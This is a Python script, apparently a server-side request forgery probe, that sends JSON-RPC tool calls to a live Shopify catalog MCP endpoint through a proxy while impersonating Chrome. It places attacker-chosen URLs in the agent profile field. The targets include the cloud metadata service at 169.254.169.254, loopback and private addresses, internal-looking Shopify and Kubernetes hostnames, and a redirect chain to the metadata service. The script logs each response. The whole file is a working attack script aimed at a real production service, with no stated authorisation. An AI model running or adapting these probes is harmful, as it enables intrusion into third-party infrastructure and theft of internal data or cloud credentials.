# -*- coding: utf-8 -*-
"""SSRF 测试 v3:https 允许列表/内网域名解析行为分析"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile}}, "query": "shoes"}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        print(f"[{label}] HTTP {r.status_code} {dt:.1f}s | {r.text[:260]}")
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s {type(e).__name__} {e}")

if __name__ == "__main__":
    tests = [
        ("基线-shopify.dev", "https://shopify.dev/ucp/agent-profiles/2026-04-08/personal_agent.json"),
        ("外网-example", "https://example.com/"),
        ("外网-google", "https://www.google.com/"),
        ("外网-jsonplaceholder", "https://jsonplaceholder.typicode.com/todos/1"),
        ("IP直连-127", "https://127.0.0.1/"),
        ("IP直连-127-8080", "https://127.0.0.1:8080/"),
        ("IP直连-169.254", "https://169.254.169.254/latest/meta-data/"),
        ("IP直连-10", "https://10.0.0.1/"),
        ("IP直连-172", "https://172.16.0.1/"),
        ("IP直连-192", "https://192.168.0.1/"),
        ("内网域-shop-server", "https://shop-server.sfe.shopifyinternal.com/"),
        ("内网域-web-shop-client", "https://web-shop-client.shop.dev/"),
        ("K8s-otlp", "https://collector.tracing-production-proxy.svc.cluster.local.:4317/"),
        ("内网域-other", "https://foo.shopifysvc.com/"),
        ("重定向httpbin", "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"),
    ]
    for label, p in tests:
        probe(label, p)
        time.sleep(0.4)
